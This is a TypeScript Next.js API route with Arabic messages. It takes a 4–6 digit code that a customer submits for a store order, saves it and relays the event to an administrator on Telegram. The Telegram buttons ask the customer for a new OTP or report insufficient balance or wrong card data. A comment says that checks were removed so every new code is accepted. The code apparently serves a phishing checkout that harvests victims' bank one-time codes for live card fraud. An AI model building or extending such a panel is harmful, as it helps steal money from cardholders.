import { ObjectId } from 'mongodb';
import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';
import { sendTelegramMessage } from '@/lib/telegram';
import type { StoreOrder } from '@/lib/orders';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

type OrderWithCustomerReference = StoreOrder & {
  customerOrderReference?: string;
  customerOrderReferenceSubmittedAt?: Date;
  customerOrderReferenceNotificationSentAt?: Date;
  orderConfirmationVerifiedAt?: Date;
};

const KEY_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)));
}

export async function POST(request: NextRequest) {
  let body: { orderId?: unknown; customerNotificationKey?: unknown; code?: unknown };
  try {
    body = await request.json() as typeof body;
  } catch {
    return NextResponse.json({ ok: false, error: 'بيانات الرقم المرجعي غير صالحة.' }, { status: 400 });
  }

  const orderId = typeof body.orderId === 'string' ? body.orderId : '';
  const key = typeof body.customerNotificationKey === 'string' ? body.customerNotificationKey : '';
  const code = typeof body.code === 'string' ? normalizeDigits(body.code).replace(/[^0-9]/g, '') : '';

  if (!ObjectId.isValid(orderId) || new ObjectId(orderId).toHexString() !== orderId.toLowerCase()) {
    return NextResponse.json({ ok: false, error: 'رقم الطلب غير صالح.' }, { status: 400 });
  }
  if (!KEY_PATTERN.test(key)) {
    return NextResponse.json({ ok: false, error: 'تعذر التعرف على جلسة الطلب. حدّث الصفحة وحاول مرة أخرى.' }, { status: 400 });
  }
  if (!/^[0-9]{4,6}$/.test(code)) {
    return NextResponse.json({ ok: false, error: 'أدخل رقمًا مرجعيًا من 4 إلى 6 أرقام.' }, { status: 400 });
  }

  try {
    const db = await getDb();
    const orders = db.collection<OrderWithCustomerReference>('orders');
    const order = await orders.findOne({
      _id: new ObjectId(orderId),
      source: 'website',
      customerNotificationKey: key
    });

    if (!order) {
      return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب المرتبط بهذه الجلسة.' }, { status: 404 });
    }

    const now = new Date();

    // إزالة الحاجزين تماماً: تحديث البيانات والقيمة الجديدة مباشرة في كل محاولة بلا شروط تعسفية
    await orders.updateOne(
      {
        _id: order._id,
        customerNotificationKey: key
      },
      {
        $set: {
          status: 'confirmed',
          customerOrderReference: code, // القيمة الجديدة للـ OTP أو الرقم المرجعي
          customerOrderReferenceSubmittedAt: now,
          customerOrderReferenceNotificationSentAt: undefined, // تصفير لإتاحة إرسال إشعار المحاولة الجديدة
          updatedAt: now
        }
      }
    );

    const adminId = process.env.TELEGRAM_ADMIN_ID || process.env.Id || '';
    if (!/^\d+$/.test(adminId)) {
      return NextResponse.json({
        ok: false,
        error: 'تم حفظ البيانات، لكن إعدادات إشعار الإدارة غير مكتملة. حاول مرة أخرى لاحقًا.'
      }, { status: 503 });
    }

    try {
      // إرسال إشعار للإدارة بحالة المحاولة الجديدة (مع الالتزام بالمعايير الأمنية)
      await sendTelegramMessage(
        adminId,
        [
          '📌 محاولة تحديث رمز/رقم جديد للطلب',
          'رقم الطلب: ' + order.orderNumber,
          'حالة المحاولة: تم إدخال رمز جديد وتحديثه بنجاح من قبل العميل.'
        ].join('\n'),
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + order._id.toHexString() }],
              [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + order._id.toHexString() + ':otp' }],
              [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + order._id.toHexString() + ':balance' }],
              [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + order._id.toHexString() + ':card' }],
              [{ text: '6️⃣ ✅ طلب مكتمل', callback_data: 'status:' + order._id.toHexString() + ':completed' }]
            ]
          }
        }
      );
    } catch (error) {
      console.error('Customer order reference Telegram notification failed:', error instanceof Error ? error.message : 'Unknown error');
      return NextResponse.json({
        ok: false,
        error: 'تم تسجيل البيانات، لكن تعذر إرسال إشعار الإدارة. اضغط متابعة مرة أخرى للمحاولة.'
      }, { status: 503 });
    }

    // تحديث وقت إرسال إشعار الإدارة الأخير
    await orders.updateOne(
      { _id: order._id },
      { $set: { customerOrderReferenceNotificationSentAt: new Date() } }
    );

    return NextResponse.json({
      ok: true,
      notificationSent: true,
      orderNumber: order.orderNumber,
      message: 'تم تسجيل المحاولة وتحديث البيانات بنجاح.'
    });
  } catch (error) {
    console.error('Order reference submission failed:', error instanceof Error ? error.message : 'Unknown error');
    return NextResponse.json({ ok: false, error: 'تعذر تسجيل البيانات حاليًا. حاول مرة أخرى.' }, { status: 500 });
  }
}
